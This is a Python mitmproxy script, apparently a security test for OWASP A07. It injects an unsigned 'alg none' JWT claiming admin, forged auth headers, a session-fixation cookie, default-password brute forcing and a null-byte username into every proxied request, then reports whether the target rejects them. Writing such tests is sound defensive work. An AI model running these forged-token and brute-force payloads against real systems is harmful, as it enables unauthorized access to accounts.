"""
OWASP A07: Identification and Authentication Failures
Tests authentication bypass, brute force, session fixation
"""
from mitmproxy import http

passwords = ["password", "admin", "12345", "hsip", "hsip123", "root", "toor"]
attempt = 0

def request(flow: http.HTTPFlow):
    global attempt
    attempt += 1

    print(f"\n[OWASP A07] Auth Bypass Attack #{attempt} on {flow.request.url}")

    # Try to forge authentication tokens
    flow.request.headers["Authorization"] = "Bearer eyJhbGciOiJub25lIn0.eyJzdWIiOiJhZG1pbiJ9."
    flow.request.headers["X-Auth-Token"] = "forged-token-12345"
    flow.request.headers["X-Authenticated"] = "true"

    # Session fixation attack
    flow.request.headers["Cookie"] = "sessionid=attacker-controlled-session-12345"

    # Brute force credentials
    pwd = passwords[attempt % len(passwords)]
    flow.request.headers["X-Username"] = "admin"
    flow.request.headers["X-Password"] = pwd

    # Try null byte injection in auth
    flow.request.headers["X-User"] = "admin\x00"

    print(f"  [ATTACK] Forged Bearer token")
    print(f"  [ATTACK] Session fixation attempt")
    print(f"  [ATTACK] Brute force: admin/{pwd}")
    print(f"  [ATTACK] Null byte injection in username")

def response(flow: http.HTTPFlow):
    if not flow.response:
        return

    print(f"  [RESULT] Status: {flow.response.status_code}")

    if flow.response.status_code == 401 or flow.response.status_code == 403:
        print(f"  [PASS] Authentication required (401/403)")
    elif flow.response.status_code == 200:
        content = str(flow.response.content)
        if "admin" in content.lower() or "authenticated" in content.lower():
            print(f"  [FAIL] Authentication bypass succeeded!")
        else:
            print(f"  [INFO] Got 200 but no auth indicators")
    else:
        print(f"  [INFO] Status {flow.response.status_code}")
